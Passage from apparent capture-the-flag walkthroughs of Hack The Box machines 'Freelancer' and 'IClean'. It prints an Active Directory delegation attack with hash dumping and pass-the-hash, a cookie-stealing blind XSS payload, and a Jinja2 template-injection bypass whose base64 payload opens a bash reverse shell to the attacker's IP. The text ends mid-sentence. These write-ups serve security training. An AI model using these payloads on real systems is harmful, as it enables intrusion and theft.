accountExpires : 9223372036854775807 badPasswordTime : 0 badPwdCount : 0 CanonicalName : freelancer.htb/Deleted Objects/Emily Johnson DEL:0c78ea5f-c198-48da-b5fa-b8554a02f3b6 CN : Emily Johnson DEL:0c78ea5f-c198-48da-b5fa-b8554a02f3b6 codePage : 0 countryCode : 0 Created : 10/11/2023 9:35:12 PM createTimeStamp : 10/11/2023 9:35:12 PM Deleted : True Description : Incident Responder DisplayName : DistinguishedName : CN=Emily Johnson\\0ADEL:0c78ea5f-c198-48da-b5fa-b8554a02f3b6,CN=Deleted Objects,DC=freelancer,DC=htb dSCorePropagationData : {10/12/2023 3:20:27 AM, 12/31/1600 7:00:00 PM} givenName : Emily instanceType : 4 isDeleted : True LastKnownParent : CN=Users,DC=freelancer,DC=htb lastLogoff : 0 lastLogon : 0 logonCount : 0 memberOf : {CN=Event Log Readers,CN=Builtin,DC=freelancer,DC=htb, CN=Performance Log Users,CN=Builtin,DC=freelancer,DC=htb, CN=Performance Monitor Users,CN=Builtin,DC=freelancer,DC=htb} Modified : 1/2/2024 3:21:43 AM modifyTimeStamp : 1/2/2024 3:21:43 AM msDS-LastKnownRDN : Emily Johnson Name : Emily Johnson DEL:0c78ea5f-c198-48da-b5fa-b8554a02f3b6 nTSecurityDescriptor : System.DirectoryServices.ActiveDirectorySecurity ObjectCategory : ObjectClass : user ObjectGUID : 0c78ea5f-c198-48da-b5fa-b8554a02f3b6 objectSid : S-1-5-21-3542429192-2036945976-3483670807-1125 primaryGroupID : 513 ProtectedFromAccidentalDeletion : False pwdLastSet : 133415481121389460 sAMAccountName : ejohnson sDRightsEffective : 0 sn : Johnson userAccountControl : 66048 userPrincipalName : ejohnson@freelancer.htb uSNChanged : 200873 uSNCreated : 192612 whenChanged : 1/2/2024 3:21:43 AM whenCreated : 10/11/2023 9:35:12 PM What can we infer from all this data? Let&rsquo;s just consider the groups they are members of:
Emily Johnson: CN=Event Log Readers,CN=Builtin,DC=freelancer,DC=htb, CN=Performance Log Users,CN=Builtin,DC=freelancer,DC=htb, CN=Performance Monitor Users,CN=Builtin,DC=freelancer,DC=htb James Moore: CN=Event Log Readers,CN=Builtin,DC=freelancer,DC=htb, CN=Performance Log Users,CN=Builtin,DC=freelancer,DC=htb, CN=Performance Monitor Users,CN=Builtin,DC=freelancer,DC=htb Abigail Morris: Nothing special Noah Baker: just a regular user Tony Stark: CN=IT Technicians,CN=Users,DC=freelancer,DC=htb, CN=Backup Operators,CN=Builtin,DC=freelancer,DC=htb Liza Kazanof: CN=Remote Management Users,CN=Builtin,DC=freelancer,DC=htb, CN=Backup Operators,CN=Builtin,DC=freelancer,DC=htb. That message about the memory dump that we found earlier involved Liza Kazanof, too. IF I&rsquo;m able to recover a few of these accounts, there&rsquo;s definitely a path to DA. Starting from Lorra199, the process might be something like:
Restore Liza Kazanof. Somehow get creds for Liza? Log in using WinRM See if Liza is able to restore a backup that exists somewhere? Try to find creds for James Moore Pwn the system as James &#x1f605; That&rsquo;s a lot of hypotheticals. If I don&rsquo;t see another way forward, I&rsquo;ll definitely come back to check this out &#x1f6a9;
Besides this list of deleted objects, is there anything else special about AD Recycle Bin? Bloodhound shows some interesting info - the results of running the Shortest Paths to Unconstrained Delegation Systems query shows something that gives me a little hope:
Right-clicking on GenericWrite and selecting Help shows some information on how this permission could be used to gain control over dc.freelancer.htb:
(From Bloodhound&rsquo;s &ldquo;GenericWrite&rdquo; help)
Info The members of the group AD RECYCLE BIN@FREELANCER.HTB have generic write access to the computer DC.FREELANCER.HTB.
Generic Write access grants you the ability to write to any non-protected attribute on the target object, including &ldquo;members&rdquo; for a group, and &ldquo;serviceprincipalnames&rdquo; for a user
Linux Abuse Resource-Based Constrained Delegation First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket&rsquo;s addcomputer.py example script:
addcomputer.py -method LDAPS -computer-name &#39;ATTACKERSYSTEM$&#39; -computer-pass &#39;Summer2018!&#39; -dc-host $DomainController -domain-netbios $DOMAIN &#39;domain/user:password&#39; We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket&rsquo;s rbcd.py script can be used for that purpose:
rbcd.py -delegate-from &#39;ATTACKERSYSTEM$&#39; -delegate-to &#39;TargetComputer&#39; -action &#39;write&#39; &#39;domain/user:password&#39; And finally we can get a service ticket for the service name (sname) we want to &ldquo;pretend&rdquo; to be &ldquo;admin&rdquo; for. Impacket&rsquo;s getST.py example script can be used for that purpose.
getST.py -spn &#39;cifs/targetcomputer.testlab.local&#39; -impersonate &#39;admin&#39; &#39;domain/attackersystem$:Summer2018!&#39; This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER.
Shadow Credentials attack To abuse this privilege, use pyWhisker.
pywhisker.py -d &#34;domain.local&#34; -u &#34;controlledAccount&#34; -p &#34;somepassword&#34; --target &#34;targetAccount&#34; --action &#34;add&#34; For other optional parameters, view the pyWhisker documentation.
(I checked out the pyWhisker github repo and it doesn&rsquo;t seem applicable to this scenario, so instead I&rsquo;ll explore the Resource-based Constrained Delegation strategy instead.)
RBCD Attack Add new computer As noted in the Help text in Bloodhound, I&rsquo;ll first attempt to add a new computer to the domain:
Huh? Well, the only thing about that command that would utilize SSL is the part specifying LDAPS, so let&rsquo;s try the other option instead:
impacket-addcomputer -method SAMR -computer-name &#39;JIMBOBCOMPUTER$&#39; -computer-pass &#39;JimbobRulez1!&#39; -dc-host &#39;dc.freelancer.htb&#39; -domain-netbios &#39;freelancer.htb&#39; &#39;freelancer.htb/lorra199:PWN3D#l0rr@Armessa199&#39; Configure delegation Great! Now the next step is configure the &ldquo;target&rdquo; computer so that we can delegate our newly-added computer to it. In this case, the &ldquo;target&rdquo; computer is DC.FREELANCER.HTB, so the computer name we&rsquo;ll use is DC$:
impacket-rbcd -delegate-from &#39;JIMBOBCOMPUTER$&#39; -delegate-to &#39;DC$&#39; -action &#39;write&#39; &#39;freelancer.htb/lorra199:PWN3D#l0rr@Armessa199&#39; Obtain a service ticket OK, now that delegation is set up, I&rsquo;ll try to obtain a service ticket as Administrator:
impacket-getST -spn &#39;cifs/dc.freelancer.htb&#39; -impersonate &#39;Administrator&#39; &#39;freelancer.htb/JIMBOBCOMPUTER$:JimbobRulez1!&#39; &#x1f440; Well that&rsquo;s a little odd. My clock is off by three minutes. I set the clock properly and tried again, but got the same error. Maybe it&rsquo;s a time zone thing? We can calculate the clock offset using the results of the smb scripts results shown in nmap scans (I&rsquo;m 5h ahead).
I could probably just reset my clock, but that&rsquo;s a little annoying to do. Thankfully, there is a handy tool called faketime that helps with this:
sudo apt install faketime # usage: faketime -f &lt;skew&gt; &lt;cmd&gt; So let&rsquo;s try this again:
faketime -f +5h impacket-getST -spn &#39;cifs/dc.freelancer.htb&#39; -impersonate &#39;Administrator&#39; &#39;freelancer.htb/JIMBOBCOMPUTER$:JimbobRulez1!&#39; &#x1f44d; Perfect! That Administrator.ccache file holds the service ticket that I need to act as Administrator. With that, I can do basically anything &#x1f601; Why not dump all the hashes?
Dump the hashes &#x1f447; It seems like I need to keep specifying the time offset, now that I&rsquo;m using a service ticket that was gained that way
What? The Administrator.ccache file is right there, in my working directory &#x1f914;
Aha, checking impacket-secretsdump -h reveals that the -k option is actually expecting an environment variable to be set:
export KRB5CCNAME=Administrator.ccache faketime -f +5h impacket-secretsdump &#39;freelancer.htb/Administrator@dc.freelancer.htb&#39; -k -no-pass -just-dc-ntlm -outputfile &#39;dumped_secrets.ntlm&#39; &#x1f920; Success!!! The keys to the castle. This dumps all of the hashes on the system, so we can utilize this for passing-the-hash:
Passing the hash We can pass the hash using several tools, but evil-winrm works fine:
evil-winrm -i $RADDR -u &#39;Administrator&#39; -H &#39;0039318f1e8274633445bce32ad1a290&#39; &#x1f3c1; There&rsquo;s the flag, exactly where it should be. Read it for well-earned points:
type C:\\Users\\Administrator\\Desktop\\root.txt CLEANUP Attacker I&rsquo;ll clean up my /etc/hosts file
sudo vim /etc/hosts It&rsquo;s also good policy to get rid of any extraneous firewall rules I may have defined. This one-liner just deletes all the ufw rules:
NUM_RULES=$(($(sudo ufw status numbered | wc -l)-5)); for (( i=0; i&lt;$NUM_RULES; i++ )); do sudo ufw --force delete 1; done; sudo ufw status numbered; LESSONS LEARNED Attacker &#x23ea; Test the password reset procedure, even if it seems like it isn&rsquo;t actually related to attacking the target. In Freelancer, at first glance we would not be able to have access to the Employer role of the dashboard. However, due to a flaw in the logic of the password reset procedure, we gained entry just by performing a password reset (on an uninitialized/unapproved account).
&#x1f436; In Bloodhound, explore the edges of groups of owned principals, not just the edges outbound from users. There is a huge wealth of knowledge tucked inside Bloodhound&rsquo;s Help text - use it to your advantage whenever you&rsquo;re attacking an Active Directory environment.
&#x2757; Remember to test for RCE, even if there is no SQLi. Just because you can&rsquo;t recklessly throw sqlmap at an interface doesn&rsquo;t mean that you can&rsquo;t gain RCE! It&rsquo;s still definitely worth checking for common RCE methods any time you find an SQL console.
&#x1f6bf; Keep lists of users and lists of passwords when attacking a target. Any time you add a new entry to either, try using crackmapexec to try all new pairs of credentials. Also be sure to any modes of crackmapexec that apply to the target (ex. winrm, SMB&hellip;) Defender &#x2b1b; QR codes don&rsquo;t add any security. Use them the same way you would use any other token that would be shared in plaintext. Beware any false sense of security that such a mechanism might add.
&#x1f39f;&#xfe0f; Use anti-CSRF tokens properly. Throughout the initial foothold on this box, it became clear that the anti-CSRF token (the one stored as a cookie) was completely static. This token should be rotated, in general, every time a new resource is loaded. When the token is too permanent, it ceases to perform the function it was intended to perform.
&#x1f4be; Backups and memory dumps should only be accessible to admins. I don&rsquo;t like setting a hard rule like that, but the likelihood of accidentally including some kind of sensitive information in backups or memory dumps is very high. For a typical environment, it would be incredibly difficult to prevent credentials or PII from finding its way into a memory dump.
`,url:"https://4wayhandshake.github.io/walkthrough/freelancer/"},"https://4wayhandshake.github.io/walkthrough/iclean/":{title:"IClean",tags:["Blind XSS","Session Hijacking","QR Code","SSTI","WAF Bypass","Password Cracking","Malicious PDF"],categories:["Walkthrough","HTB","Linux","Medium"],content:`INTRODUCTION In my opinion, IClean was a really cool box. It provides a pleasant balance of recon, exploitation, and CTF-style puzzle-solving. This box provides a more realistic web attack surface than many other boxes - there are lots of pages to explore, and many ways that one could think to attack them. I&rsquo;d highly recommend IClean to anyone that wants a reasonably challenging (but not too long) web-focused box. Personally, I think this one is on the &ldquo;hard&rdquo; side of medium difficulty.
Initial recon brings you to a form where you can request a quote. Small hints suggest that there may be an XSS opportunity. Indeed, there is a fairly straightforward blind XSS to exploit. I used this opportunity to write my latest tool, Crxss-Eyed, used for blind XSS discovery (Check it out if you want &#x2764;&#xfe0f; PRs welcome​). Successful XSS leads you into an admin dashboard
The admin dashboard provides an initially overwhelming attack surface, but eventually leads to a fairly challenging SSTI. Successful identification of the SSTI requires us diligently test every input. Once the SSTI is finally identified, it still requires a tricky bypass of blacklisted characters to properly exploit it. While successful exploitation finally grants us a foothold, we still need to privesc from the webserver service account to a regular user before the user flag can be obtained. Thankfully, all this requires is access to the password hashes in the database, some hash cracking, and a little luck with credential re-use.
Privilege escalation to root is simple, but will likely require a bit of research. The vulnerability is well-documented if you know what to look for. Since we&rsquo;re able to obtain the exact version of the vulnerable application, I recommend creating a simple test environment on your local attacker machine when developing your final payload. Otherwise, it might be hard to miss the flag, even once you do obtain it.
RECON nmap scans Port scan I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to the target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Script scan To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 2c:f9:07:77:e3:f1:3a:36:db:f2:3b:94:e3:b7:cf:b2 (ECDSA) |_ 256 4a:91:9f:f2:74:c0:41:81:52:4d:f1:ff:2d:01:78:6b (ED25519) 80/tcp open http Apache httpd 2.4.52 ((Ubuntu)) |_http-title: Site doesn&#39;t have a title (text/html). |_http-server-header: Apache/2.4.52 (Ubuntu) Vuln scan Now that we know what services might be running, I&rsquo;ll do a vulnerability scan:
sudo nmap -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script &#39;safe and vuln&#39; $RADDR No results from the vuln scan.
UDP scan To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR &#x261d;&#xfe0f; UDP scans take quite a bit longer, so I limit it to only common ports
PORT STATE SERVICE VERSION 7/udp open|filtered echo 68/udp open|filtered tcpwrapped 136/udp open|filtered tcpwrapped 137/udp open|filtered netbios-ns 520/udp open|filtered route 593/udp open|filtered tcpwrapped 997/udp open|filtered tcpwrapped 1023/udp open|filtered tcpwrapped 1812/udp open|filtered radius 1900/udp open|filtered upnp 5060/udp open|filtered sip 5353/udp open|filtered zeroconf 49182/udp open|filtered unknown 49191/udp open|filtered unknown Note that any open|filtered ports are either open or (much more likely) filtered.
Interesting&hellip; radius, sip, samba: it might be an enterprise target.
Webserver Strategy Noting the redirect from the nmap scan, I added download.htb to /etc/hosts and did banner grabbing on that domain:
DOMAIN=template.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
whatweb $RADDR &amp;&amp; curl -IL http://$RADDR We already saw the Apache version from nmap, but note the redirect to http://capiclean.htb.
Next I performed vhost and subdomain enumeration:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v No result. Now I&rsquo;ll check for subdomains of capiclean.htb:
ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.$DOMAIN&#34; -c -t 60 -o fuzzing/vhost-$DOMAIN.md -of md -timeout 4 -ic -ac -v No new results from that. I&rsquo;ll move on to directory enumeration on http://capiclean.htb:
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&#34; ffuf -w $WLIST:FUZZ -u http://$DOMAIN/FUZZ -t 80 -c -o ffuf-directories-root -of json-timeout 4 -v Directory enumeration against http://capiclean.htb/ gave the following:
Lots of results! The most notable are /dashboard and /server-status. Probably, both are behind the /login page.
Exploring the Website I can&rsquo;t not say it: this site has really nice CSS. All the transitions are tasteful, and the design is just&hellip; clean &#x1f60d;
The index page has links to section-specific pages that are largely uninteresting - just copies of content from the index page. It also has links to a /quote page (with a form that POSTs to /sendMessage) and a /login page (with a form that POSTs to /login).
We can see from the response headers of any page the server framework and language:
Server: Werkzeug/2.3.7 Python/3.10.12
When I submit the form on the /quote page, there is a message that might be a hint:
&#x1f914; So the management team will take a look at my quote request, eh? If there&rsquo;s a &ldquo;person&rdquo; on the other end of this form, reviewing requests, then there might be an XSS opportunity here. And if that&rsquo;s true, it might be the thing to get me past the /login page, through to /dashboard. I&rsquo;ll investigate this soon &#x1f6a9;
FOOTHOLD Credential Guessing Since it&rsquo;s simple and easy, I&rsquo;ll start with a quick credential-guessing attempt on the login page. First, I made one login attempt and proxied it through zap, saving the request as login_post.raw. Now, I&rsquo;ll run it through ffuf:
USERS=/usr/share/seclists/Usernames/000-usernames-short.txt PASSWORDS=/usr/share/seclists/Passwords/500-worst-passwords.txt ffuf -w &#34;$USERS&#34;:USER -w &#34;$PASSWORDS&#34;:PASS -request login_post.raw -d &#34;username=USER&amp;password=PASS&#34; -c -v -fs 2172 No luck. There&rsquo;s no registration page; I can&rsquo;t see the correct result of authentication, so my options are a little limited.
SQL Injection Again, since it&rsquo;s simple and easy, I&rsquo;ll try SQLi next. There are two forms to interact with, so I&rsquo;ll try throwing sqlmap at them:
sqlmap -u &#39;http://capiclean.htb/login&#39; -X POST --data &#39;username=jimbob&amp;password=Password123&#39; --random-agent --level=3 --risk=2 --batch sqlmap -u &#39;http://capiclean.htb/sendMessage&#39; -X POST --data &#39;service=Carpet+Cleaning&amp;service=Tile+%26+Grout&amp;service=Office+Cleaning&amp;email=test40test.test&#39; --random-agent --level=3 --risk=2 --batch Neither of these attempts led to a result.
Blind XSS As previously mentioned, there &ldquo;quote accepted&rdquo; page (at /sendMessage) hints that there might be a person that will review my request for a quote. Proxying the form submission, we can see what data is available to play with:
service=Carpet+Cleaning&amp;service=Tile+%26+Grout&amp;email=test%40test.test Huh, it&rsquo;s odd that there are two parameters with the same name, but I think that&rsquo;s technically allowed. Messing around with this a little, I see that it&rsquo;s easy to bypass the frontend validation on the email field - so essentially both service and email are free-form text fields.
After trying a variety of characters, it seems like there isn&rsquo;t really any blacklist or anything, so I think I&rsquo;m free to try whatever XSS payloads I want. This will be a blind XSS, so it might take a few tries.
I&rsquo;m not very experienced with XSS, so I thought it would be best to try a whole bunch of payloads for XSS detection. When I try to find an XSS-vulnerable form input, I find it&rsquo;s really useful to label the payload with some kind of identifying text, so that I can try a whole bunch rapidly and still know which was successful (if any).
In addition to that, it&rsquo;s usually smart to try a variety of HTML escapes to break out of the DOM context and execute javascript. Lately, I&rsquo;ve been trying the following escapes:
nothing (&ldquo;bare&rdquo;) a singlequote ' a doublequote &quot; a ket &gt; combined with each of the above three. Just like when trying multiple payloads, it&rsquo;s important to label each XSS attempt with which escape was used in the payload
&hellip; and just to add to that, we&rsquo;re attempting the XSS on multiple fields, sometimes at the same time. So it&rsquo;s important to label the payload with the input it was used against.
&#x1f635; Are all the permutations making your head spin yet?
In short, my XSS payloads might be something like this, for example:
&#34;&lt;script&gt;document.location=&#39;http://10.10.14.39:8000/?payload=scriptdocloc&amp;esc=dblquote&amp;field=service&#39;&lt;/script&gt; As you might imagine, this is really tedious to test manually. It involves a ton of copy-pasting, lots of clicking, etc&hellip; Boring!
To expedite this whole process, I spend the last few hours writing my latest tool, Crxss-Eyed. It&rsquo;s still very fresh, and I have a lot to add to it, but it seems to work very well! This tool automates the whole process described above, submitting and labelling each payload so that I can identify which worked.
Please check out my repo if you want to give it a try!
To automate the blind XSS attempts, I&rsquo;m applying my new tool (described above). It goes hand-in-hand with another one of my tools, http-simple-server. We&rsquo;ll set up an HTTP server as a listener for callbacks from the blind XSS:
sudo ufw allow from $RADDR to any port 8000 proto tcp cd www simple-server 8000 -v Now that the http server is listening, I&rsquo;ll fire off the XSS payloads, testing it against both the service and email fields:
python3 crxss-eyed.py &#39;http://capiclean.htb/sendMessage&#39; &#39;http://10.10.14.39:8000&#39; &#39;service=Carpet&amp;email=test@test.test&#39; &#39;service,email&#39; &#x1f602; After a few moments, we can see a ton of successful XSS attempts roll in!
My http-simple-server automatically attempts to base64-decode any data that was send as the b64 parameter in a GET request. I&rsquo;ve also recently revised it so this mechanism works on base64 data with periods in it, like a JWT.
(it also handles file uploads nicely.) Check it out if you want.
Roughly 40 or so payloads were successful. I didn&rsquo;t count, but it was plenty. Here&rsquo;s one that was already configured to grab the target&rsquo;s cookie:
Fantastic! Not only did we find the get a session cookie, but we also have the decoded value of it:
session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.Zk8I8g.HQvZScg8fvxuAxx2fUnPtdsP44g
role: 21232f297a57a5a743894a0e4a801fc3
That role format looks pretty familiar - could be an MD5 hash. I&rsquo;ll run it through CrackStation to see:
&#x1f920; The role is just the MD5 hash of &ldquo;admin&rdquo;!
Since we have the session cookie of, presumably, someone in &ldquo;management&rdquo;, that should be enough to get us past the /login page. I&rsquo;ll copy the session cookie into my own browser and set the cookie&rsquo;s scope to /, then try navigating over to the dashboard.
Admin Dashboard Navigating to /dashboard confirms that all of the previous hunches were indeed correct:
There are four functions here, so let&rsquo;s try each out and get a feel for how the dashboard works.
Generate Invoice At /InvoiceGenerator we can choose a service, record a project, client, address, and email, then generate an invoice.
This form submits via POSTing regular x-www-form-urlencoded data to /InvoiceGenerator:
selected_service=Basic+Cleaning&amp;qty=1&amp;project=MyProject&amp;client=MyClient&amp;address=123+Fake+St&amp;email-address=fake%40fake.fake The result is a page showing the invoice number, 1142339475:
Generate QR This links to /QRGenerator, which allows us to enter an invoice number and generate a qr code. When we do that, it takes a moment then generates a link:
Note that the invoice number is reflected in the generated png filename. Some may consider this an example of IDOR. We can also input the link into the field below to generate an invoice using that QR code.
Note to self: I should check this field later to see if I can input any QR code into the web app - even an external one &#x1f6a9;
Several user-controllable fields are reflected onto this page, so I should test all of these for SSTI. If this is getting recorded, I should also check if it could lead to SQLi (or maybe XXE, I&rsquo;m still not sure how the data is stored! - heck, maybe it&rsquo;s just in a JSON file or something.) &#x1f6a9;
Curious about what data was actually inside that QR code, I ran it through an online tool to read it. The result was a link: http://capiclean.htb/QRInvoice/invoice_1142339475.html. When I opened that link, I found that it was another &ldquo;scannable invoice&rdquo; as shown above, but slightly different - the Invoice number was different, and there was a different price on the cleaning service.
Oddly though, opening that link seems to have affected the original &ldquo;scannable invoice&rdquo; that appeared: when I refresh the original invoice, the QR code has disappeared from the bottom corner, and it has yet another invoice number and price!
Edit Services This one links to /EditServices and does exactly what you might expect. It allows us to modify the data associated with different services that are offered:
All fields except Service description are marked readonly, but this is easily bypassable by editing the DOM. Here, I&rsquo;m editing Basic Cleaning to see which modifications are persistent:
Checking the Edit Service page again though, shows that only the changes to the Service description actually persisted.
Since we&rsquo;ve found a parameter we can control (one that might be reflected elsewhere), I should test this field later for SSTI and SQLi, maybe even XXE &#x1f6a9;
Quote Requests This loads the /QuoteRequests page, but the page is empty. This is probably where pending XSS attempts ended up, probably with some kind of Selenium bot or something to &ldquo;read&rdquo; the page.
Review: Leads To keep myself organized, I&rsquo;ll review what leads I gained from examining the dashboard:
Load an external QR code. The QR code finds its way onto the invoice. Maybe I can do something with how it renders the template? Inject malicious Invoice details. Maybe there&rsquo;s an SQLi, or SSTI? Inject malicious Service details. Maybe there&rsquo;s an SQLi? an SSTI? In terms of complexity:
It&rsquo;s really easy to verify if I can load an external QR code, but I&rsquo;m not sure what I would do with that info once its determined. It&rsquo;s pretty easy to throw sqlmap at the inputs, but a little harder to do the second-order SQLi (where any reflected info is on another page). However, if successful this might be a path towards RCE. It&rsquo;s a little harder to verify the SSTI, but still doable. If successful, this proves an almost-certain path towards RCE. &#x27a1;&#xfe0f; Taking all this into account, I think I&rsquo;ll investigate SSTI, then SQLi, then loading the external QR code.
SSTI Identification I&rsquo;ll try an SSTI polyglot in every input that I can find:
\${7*7} {{6*6}} {{5*&#39;5&#39;}} {{_self.env.display(&#34;JINJA&#34;)}} #{4*4} After generating the QR code, then navigating to the link stored in the QR code, the resulting invoice showed this:
In short, all the special characters were removed. I&rsquo;ll try url-encoding (single and double):
&#x1f447; I&rsquo;m using my own url_encoder for this, based on Python. Here&rsquo;s the repo. You could just as easily use any other tool.
url_encode &#39;\${7*7} {{6*6}} {{5*&#39;5&#39;}} {{_self.env.display(&#34;JINJA&#34;)}} #{4*4}&#39; # %24%7B7%2A7%7D+%7B%7B6%2A6%7D%7D+%7B%7B5%2A5%7D%7D+%7B%7B_self.env.display%28%22JINJA%22%29%7D%7D+%23%7B4%2A4%7D url_encode $(url_encode &#39;\${7*7} {{6*6}} {{5*&#39;5&#39;}} {{_self.env.display(&#34;JINJA&#34;)}} #{4*4}&#39;) # %2524%257B7%252A7%257D%2B%257B%257B6%252A6%257D%257D%2B%257B%257B5%252A5%257D%257D%2B%257B%257B_self.env.display%2528%2522JINJA%2522%2529%257D%257D%2B%2523%257B4%252A4%257D No luck with the URL encoding. This the result of encoding once:
I.e. all of the special characters are still removed.
There&rsquo;s also the input that accepts the Invoice link as an input. I&rsquo;ll try the payload there too:
However, this leads to an unexpected result. Producing a HTTP 500 status is often a good sign, though!
I wonder what is causing that to happen. To diagnose this, I&rsquo;ll try thinning down the payload; realistically, if an SSTI is going to work, it&rsquo;ll probably be for Jinja2 (since it&rsquo;s a Flask server), so I&rsquo;ll only include SSTI tests that should result in a positive outcome from Jinja2:
{{6*6}}{{5*&#39;5&#39;}}{{_self.env.display(&#34;JINJA&#34;)}} &hellip; But this leads to the same result. What about trying URL encoding here, too?
Very interesting - look what failed to render:
Perhaps this just because of the dead link to the QR code though? I&rsquo;ll check more closely:
Well, yes it is indeed a dead link, but we managed to sneak through some special characters! Just because they&rsquo;re not visible characters doesn&rsquo;t mean we can&rsquo;t utilize them for SSTI &#x1f609;
SSTI Exploitation Let&rsquo;s refine the SSTI payload once more. If we have a Jinja2 SSTI, the expected result is 3655555 within that img src property:
{{6*6}}{{5*&#39;5&#39;}} YES! We have a confirmed SSTI &#x1f389;
Let&rsquo;s verify by running id:
{{request.application.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()}} Hmm&hellip; That leads to another HTTP 500 status. I&rsquo;d be willing to bet that at least one of the following are in some kind of blacklist: ()._.
Thankfully, Hacktricks has a whole section on bypassing Jinja2 filters for gaining RCI via an SSTI. Various examples within that section will help isolate the character blacklist (if one exists), because several of them eliminate one particular character. Specifically, the one at the bottom gets rid of two of our suspected &ldquo;bad&rdquo; characters ( the characters(, ), ., and _ ) and leads to a reverse shell, so let&rsquo;s skip straight to that test:
Naturally, the base64 payload from that example is not specific to my reverse shell listener, so let&rsquo;s fix that:
{% with a = request[&#34;application&#34;][&#34;\\x5f\\x5fglobals\\x5f\\x5f&#34;][&#34;\\x5f\\x5fbuiltins\\x5f\\x5f&#34;][&#34;\\x5f\\x5fimport\\x5f\\x5f&#34;](&#34;os&#34;)[&#34;popen&#34;](&#34;echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zOS80NDQ0IDA+JjE= | base64 -d | bash&#34;)[&#34;read&#34;]() %} a {% endwith %} Just in case this works, I&rsquo;ll set up a reverse shell listener:
sudo ufw allow from $RADDR to any port 4444 proto tcp bash socat -d TCP-LISTEN:4444 STDOUT Now, I&rsquo;ll submit the payload through the Invoice QR Code link:
&#x1f601; There it is! We have a reverse shell:
USER FLAG Upgrade the shell In case I&rsquo;m stuck here for a while, I should take a sec to upgrade my shell. For more details, please see my guide on upgrading the shell. We know the target has python, so I&rsquo;ll use that:
python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; [Ctrl+Z] stty raw -echo; fg [Enter] [Enter] export TERM=xterm-256color export SHELL=bash Hmm, still no colors. But at least we have command history and tab completion now &#x1f937;&zwj;&#x2642;&#xfe0f;
Local enumeration: www-data Opening the reverse shell dropped us into the web app directory. Taking a peek at app.py yields some immediate results:
... secret_key = &#39;&#39;.join(random.choice(string.ascii_lowercase) for i in range(64)) app.secret_key = secret_key # Database Configuration db_config = { &#39;host&#39;: &#39;127.0.0.1&#39;, &#39;user&#39;: &#39;iclean&#39;, &#39;password&#39;: &#39;pxCsmnGLckUb&#39;, &#39;database&#39;: &#39;capiclean&#39; } ... def rdu(value): return str(value).replace(&#39;__&#39;, &#39;&#39;) def sanitize(input): sanitized_output = re.sub(r&#39;[^a-zA-Z0-9@. ]&#39;, &#39;&#39;, input) return sanitized_output There we get a glimpse at two of the filters that were causing us grief. But also, some database credentials!
iclean : pxCsmnGLckUb for database capiclean.
A quick check of the home directory indicates that the only human user is consuela. Just to eliminate the obvious, I checked right away for credential reuse over SSH - no luck!
MySQL To connect to the MySQL database easily, I&rsquo;ll establish a socks5 proxy. To do this, I&rsquo;ll download chisel (and a few other tools, like linpeas) onto the target box. I&rsquo;ll start the chisel server from my attacker box:
sudo ufw allow from $RADDR to any port 9999 proto tcp /home/kali/Tools/STAGING/chisel server --port 9999 --reverse &amp; Then, from the target, I&rsquo;ll connect back to the server:
./chisel client 10.10.14.39:9999 R:1080:socks &amp; With that done, I should be able to connect to the MySQL database comfortable from my attacker box, by using proxychains:
proxychains mysql -h 127.0.0.1 -D capiclean -u iclean -ppxCsmnGLckUb First, I&rsquo;ll check what tables exist:
The users table is always a good bet - let&rsquo;s check that out:
Hash cracking I took both these hashes and placed them, labelled, into a file for cracking:
I also checked the format of the hashes by copying one into name-that-hash:
name-that-hash -t &#39;2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51&#39; It seems confident that it&rsquo;s a SHA256 hash. This is probably verifiable by reading app.py more closely, but SHA256 is probably right. Let&rsquo;s get crackin!
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt --format=raw-sha256 Within a second, we had a result:
A password with spaces? So weird!. Let&rsquo;s try it with SSH:
ssh consuela@$RADDR &#x1f370; The SSH connection drops us into /home/consuela, right next to the user flag. Just cat it out for some points.
cat user.txt ROOT FLAG qpdf Since we logged in using a password, the #1 best thing to always check first is sudo -l:
qpdf? What&rsquo;s that? From the official documentation, we have a description:
&ldquo;QPDF provides many useful capabilities to developers of PDF-producing software or for people who just want to look at the innards of a PDF file to learn more about how they work. With QPDF, it is possible to copy objects from one PDF file into another and to manipulate the list of pages in a PDF file. This makes it possible to merge and split PDF files. The QPDF library also makes it possible for you to create PDF files from scratch&rdquo;
